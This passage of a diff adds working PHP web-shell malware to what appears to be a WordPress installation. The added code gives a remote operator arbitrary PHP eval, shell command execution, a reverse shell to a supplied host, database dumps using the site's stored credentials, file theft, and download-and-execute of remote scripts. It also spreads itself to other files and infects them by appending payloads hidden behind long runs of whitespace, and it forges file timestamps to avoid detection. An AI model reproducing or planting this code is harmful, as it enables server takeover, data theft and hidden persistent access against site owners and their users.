+						} else {
+							$res[] = array("path" => $p, "result" => "permission denied");
+						}
+					}
+				} else {
+					$find_injection = _shell('grep "\$g()" '.$p);
+					if (strpos($find_injection->body["stdout"], "\$g()") !== false) {
+						$res[] = array("path" => $p, "result" => "already infected");
+					} else {
+						$time = _shell('stat -c "%Y" '.$p)->body["stdout"];
+						if (isset($_REQUEST["private"])) {
+							$key = randomStr(12);
+							$file = str_replace("INSERT_KEY", $key, $script);
+						} else {
+							$file = $script;
+						}
+						$newlines = str_repeat("\\n", 30);
+						$tabs = str_repeat("\\t", 70);
+						$code = $newlines . $tabs . packScript($file);
+						$escaped_code = str_replace("$", "\\$", $code);
+						$append_cmd = 'printf "'.$escaped_code.'" | tee -a '.$p;
+						$append_cmd_res = _shell($append_cmd);
+						if ($append_cmd_res->body["retval"] !== 0) {
+							if (strpos(strtolower($append_cmd_res->body["stderr"]), "permission denied") !== false) {
+								$res[] = array("path" => $p, "result" => "permission denied");
+							} else {
+								$res[] = array("path" => $p, "result" => "unexpected error");
+							}
+						} else {
+							_shell('touch -d @'.((int)$time + 1).' '.$p);
+							$arr["path"] = $p;
+							if (isset($_REQUEST["private"])) {
+								$arr["key"] = $key;
+							}
+							$arr["result"] = "success";
+							$res[] = $arr;
+						}
+					}
+				}
+			}
+		} else {
+			$res[] = array("path" => $path, "result" => "not found");
+		}
+		return $res;
+	}
+	function _disinfect($path) {
+		$res = array();
+		$path_arr = _resolve_path($path);
+		$n_lines = 30;
+		if (!empty($path_arr)) {
+			foreach ($path_arr as $p) {
+				if (_edit_with_php($p)) {
+					$time = filemtime($p);
+					$file = @file_get_contents($p);
+					if ($file === false) {
+						$res[] = array("path" => $p, "result" => "permission denied");
+						continue;
+					}
+					if (strpos($file, "\$g();") === false) {
+						$res[] = array("path" => $p, "result" => "not infected");
+					} else {
+						$file_lines = explode(PHP_EOL, $file);
+						$new_file = array_slice($file_lines, 0, count($file_lines) - $n_lines);
+						if (@file_put_contents($p, implode(PHP_EOL, $new_file)) !== false) {
+							touch($p, $time);
+							if (function_exists("opcache_invalidate")) {
+								if (!(opcache_invalidate($p, true))) {
+									touch($p, $time + 1);
+								}
+							}
+							$res[] = array("path" => $p, "result" => "success");
+						} else {
+							$res[] = array("path" => $p, "result" => "permission denied");
+						}
+					}
+				} else {
+					$find_injection = _shell('grep "\$g()" '.$p);
+					if (strpos(strtolower($find_injection->body["stderr"]), "permission denied") !== false) {
+						$res[] = array("path" => $p, "result" => "permission denied");
+						continue;
+					}
+					if (strpos($find_injection->body["stdout"], "\$g()") === false) {
+						$res[] = array("path" => $p, "result" => "not infected");
+					} else {
+						$time = _shell('stat -c "%Y" '.$p)->body["stdout"];
+						$remove_cmd = 'sed -i "$(($(wc -l < '.$p.')-'.($n_lines - 1).')),\$d" '.$p;
+						$remove_cmd_res = _shell($remove_cmd);
+						if ($remove_cmd_res->body["retval"] !== 0) {
+							if (strpos(strtolower($remove_cmd_res->body["stderr"]), "permission denied") !== false) {
+								$res[] = array("path" => $p, "result" => "permission denied");
+							} else {
+								$res[] = array("path" => $p, "result" => "unexpected error");
+							}
+						} else {
+							_shell('touch -d @'.((int)$time + 1).' '.$p);
+							$res[] = array("path" => $p, "result" => "success");
+						}
+					}
+				}
+			}
+		} else {
+			$res[] = array("path" => $path, "result" => "not found");
+		}
+		return $res;
+	}
+	$cmd = isset($_REQUEST["c"]) ? $_REQUEST["c"] : null;
+
+	$webroot = realpath("../") . "/";
+	$work_dir = $webroot . "wp-content/uploads/tmp/";
+	switch ($cmd) {
+
+		case "ping":
+			echo _res("pong");
+			break;
+
+		case "version":
+			echo _res("1.09");
+			break;
+
+		case "info":
+			if (function_exists("phpinfo")) {
+				ob_start();
+				phpinfo();
+				$data = ob_get_contents();
+				ob_clean();
+			} else {
+				$opt_list = "";
+				foreach (ini_get_all(null, false) as $option => $value) {
+					$opt_list .= $option . "=" . (empty((string)$value) ? "0" : $value) . "<br/>";
+				}
+				$data = "<html><head></head><body>".$opt_list."</body></html>";
+			}
+			echo _res(base64_encode($data));
+			break;
+
+		case "clear_cache":
+			if (function_exists("opcache_reset")) {
+				if (opcache_reset()) {
+					echo _res("OK");
+				} else {
+					echo _err("OPCache API is disabled");
+				}
+			} else {
+				echo _err("OPCache API doesn't exists");
+			}
+			break;
+
+		case "clear_tmp":
+			if (removeFile($work_dir)) {
+				echo _res("OK");
+			} else {
+				echo _err("Failed to remove " . $work_dir);
+			}
+			break;
+
+		case "update":
+			if (!isset($_REQUEST["url"])) {
+				echo _err("url param is required");
+				break;
+			}
+			$r = request("GET", $_REQUEST["url"]);
+			if (!$r->success) {
+				echo _err($r->msg);
+				break;
+			}
+			$thisfile = getThisPath();
+			$time = filemtime($thisfile);
+			$pos = strpos($r->body, "INSERT_KEY");
+			$file = substr_replace($r->body, $_REQUEST["k"], $pos, strlen("INSERT_KEY"));
+			if (file_put_contents($thisfile, $file)) {
+				touch($thisfile, $time);
+				if (function_exists("opcache_invalidate")) {
+					if (!(opcache_invalidate($thisfile, true))) {
+						touch($thisfile, $time + 1);
+					}
+				}
+				echo _res("OK");
+			}
+			break;
+
+		case "download_script":
+			if (!isset($_REQUEST["url"])) {
+				echo _err("url param is required");
+				break;
+			}
+			$r = request("GET", $_REQUEST["url"]);
+			if (!$r->success) {
+				echo _err($r->msg);
+				break;
+			}
+			if (!file_exists($work_dir)) mkdir($work_dir);
+			$file_path = $work_dir;
+			$file_path .= isset($_REQUEST["name"]) ? $_REQUEST["name"] : randomStr(8);
+			$handle = fopen($file_path, "w");
+			$content = str_replace("\r", "", $r->body);
+			fputs($handle, $content);
+			fclose($handle);
+			$res = array();
+			if (isset($_REQUEST["exec"])) {
+				if ($_REQUEST["exec"] == 1) {
+					if ($_REQUEST["lang"] == "php") {
+						ob_start();
+						include_once($file_path);
+						$res["output"] = ob_get_contents();
+						ob_clean();
+					} elseif ($_REQUEST["lang"] == "sh") {
+						chmod($file_path, 0755);
+						chdir($work_dir);
+						$sh = _shell($file_path);
+						if (!$sh->success) {
+							echo _err($sh->msg);
+							break;
+						}
+						$output = $sh->body;
+						$res["output"] = $output;
+					}
+					removeFile($file_path);
+				}
+			} else {
+				$res["path"] = $file_path;
+			}
+			echo _res($res);
+			break;
+
+		case "download_file":
+			if (!isset($_REQUEST["url"])) {
+				echo _err("url param is required");
+				break;
+			}
+			if (!file_exists($work_dir)) mkdir($work_dir);
+			$file_path = $work_dir;
+			$file_path .= isset($_REQUEST["name"]) ? $_REQUEST["name"] : randomStr(8);
+			$handle = fopen($file_path, "w");
+			$r = request("GET", $_REQUEST["url"], $handle);
+			if (!$r->success) {
+				echo _err($r->msg);
+				break;
+			}
+			fclose($handle);
+			echo _res(array("path" => $file_path));
+			break;
+
+		case "php":
+			if (!isset($_REQUEST["code"])) {
+				echo _err("command code is required");
+				break;
+			}
+			ini_set("display_errors", "0");
+			function shutdownHandler()
+			{
+				$error = error_get_last();
+				switch ($error["type"]) {
+					case E_ERROR:
+					case E_CORE_ERROR:
+					case E_COMPILE_ERROR:
+					case E_USER_ERROR:
+					case E_RECOVERABLE_ERROR:
+					case E_CORE_WARNING:
+					case E_COMPILE_WARNING:
+					case E_PARSE:
+						echo _err($error["message"]);
+				}
+			}
+			register_shutdown_function("shutdownHandler");
+			try {
+				echo _res(eval(base64_decode($_REQUEST["code"])));
+			} catch (Throwable $e) {
+				echo _err($e->getMessage());
+			}
+			break;
+
+		case "exec":
+			if (!isset($_REQUEST["command"])) {
+				echo _err("command param is required");
+				break;
+			}
+			$command = $_REQUEST["command"];
+			$r = _shell($command);
+			if (!$r->success) {
+				echo _err($r->msg);
+			} else {
+				echo _res($r->body);
+			}
+			break;
+
+		case "rshell":
+			if (!isset($_REQUEST["host"])) {
+				echo _err("command ip is required");
+				break;
+			}
+			if (!isset($_REQUEST["port"])) {
+				echo _err("command port is required");
+				break;
+			}
+			if (!function_exists("proc_open")) {
+				echo _err("proc_open is disabled");
+				break;
+			}
+			if (!function_exists("fsockopen")) {
+				echo _err("fsockopen is disabled");
+				break;
+			}
+			if ($sock = @fsockopen($_REQUEST["host"], $_REQUEST["port"])) {
+				$proc = proc_open("/bin/sh -i", array( 0 => $sock, 1 => $sock, 2 => $sock), $pipes, $webroot);
+				echo _res("Socket opened to " . $_REQUEST["host"] . ":" . $_REQUEST["port"]);
+			} else {
+				echo _err("Socket connection failed.");
+			}
+			break;
+
+		case "db_dump":
+			$check = _shell("which mysqldump");
+			if (!$check->success) {
+				echo _err($check->msg);
+				break;
+			}
+			if ($check->body["retval"] !== 0) {
+				echo _err("mysqldump doesn't exists");
+				break;
+			}
+			getConfigConstants();
+			$host = DB_HOST;
+			$password = DB_PASSWORD;
+			$user = DB_USER;
+			$dbname = DB_NAME;
+			if (!file_exists($work_dir)) mkdir($work_dir);
+			$command = _shell("mysqldump --host={$host} --user={$user} --password={$password} {$dbname}");
+			if ($command->body["retval"] !== 0) {
+				echo _err($command->body["stderr"]);
+			} else {
+				echo _res(base64_encode($command->body["stdout"]));
+			}
+			break;
+
+		case "get_file":
+			if (!isset($_REQUEST["path"])) {
+				echo _err("path param is required");
+				break;
+			}
+			echo _res(base64_encode(file_get_contents($webroot . $_REQUEST["path"])));
+			break;
+
+		case "spread":
+			if (!isset($_REQUEST["path_list"])) {
+				echo _err("path_list param is required");
+				break;
+			}
+			$thisfile = getThisPath();
+			$time = filemtime($thisfile);
+			$f = file_get_contents($thisfile);
+			$res = array();
+			foreach ($_REQUEST["path_list"] as $path) {
+				$path = $webroot . $path;
+				$key = randomStr(12);
+				$file = str_replace($_REQUEST["k"], $key, $f);
+				if (file_put_contents($path, $file)) {
+					touch($path, $time);
+					$res[] = array("path" => $path, "key" => $key);
+				}
+			}
+			echo _res($res);
+			break;
+
+		case "infect":
+			if (!isset($_REQUEST["url"])) {
+				echo _err("url param is required");
+				break;
+			}
+			if (!isset($_REQUEST["path_list"])) {
+				echo _err("path_list param is required");
+				break;
+			}
+			$f = request("GET", $_REQUEST["url"]);
+			if ($f->success) {
+				$res = array();
+				foreach ($_REQUEST["path_list"] as $path) {
+					$fullpath = $webroot . $path;
+					$res = array_merge($res, _infect($fullpath, $f->body));
+				}
+				echo _res($res);
+			} else {
+				echo _err($r->msg);
+			}
+			break;
+
+		case "disinfect":
+			if (!isset($_REQUEST["path_list"])) {
+				echo _err("path_list param is required");
+				break;
+			}
+			$res = array();
+			foreach ($_REQUEST["path_list"] as $path) {
+				$fullpath = $webroot . $path;
+				$res = array_merge($res, _disinfect($fullpath));
+			}
+			echo _res($res);
+			break;
+
+		case "remove_file":
+			if (!isset($_REQUEST["path"])) {
+				echo _err("path param is required");
+				break;
+			}
+			$file = $webroot . $_REQUEST["path"];
+			if (removeFile($file)) {
+				echo _res("File " . $file . " has been removed");
+			} else {
+				echo _err("Failed to remove file " . $file);
+			}
+			break;
+
+		default:
+			echo _err("No command specified or command is not correct");
+			break;
+	}
+
+	if ('.inc' === basename(__FILE__)) { throw new Exception('die'); } else { die(); };
 }
